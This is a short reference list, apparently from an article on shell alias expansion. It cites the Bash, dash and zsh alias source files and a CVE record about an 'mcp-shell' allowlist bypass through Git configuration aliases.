- [GNU Bash 5.3 `parse.y` and `alias.c`](https://git.savannah.gnu.org/cgit/bash.git/plain/parse.y) - primary source implementation of `alias_expand_token()`, `mk_alexpansion()`, the end-of-alias space in `shell_getc()`, `STRING_SAVER`, and the `expand_aliases` flag (its defaults are set in `shell.c` and `general.c`).
- [dash `src/alias.c`, `src/parser.c`, and `src/input.c`](https://git.kernel.org/pub/scm/utils/dash/dash.git/plain/src/alias.c) - reference Almquist shell implementation of `atab[39]`, `pushstring()`, `popstring()`, `ALIASINUSE`, and deferred `ALIASDEAD` deallocation.
- [zsh `Src/lex.c` and `Src/hashtable.c`](https://raw.githubusercontent.com/zsh-users/zsh/master/Src/lex.c) - implementation of regular, global (`alias -g`), and suffix (`alias -s`) alias resolution via `checkalias()` and `inpush()`.
- [CVE-2026-55582 Vulnerability Record](https://cveawg.mitre.org/api/cve/CVE-2026-55582) - primary security record for the `mcp-shell` allowlist bypass and arbitrary shell command injection via Git configuration aliases.
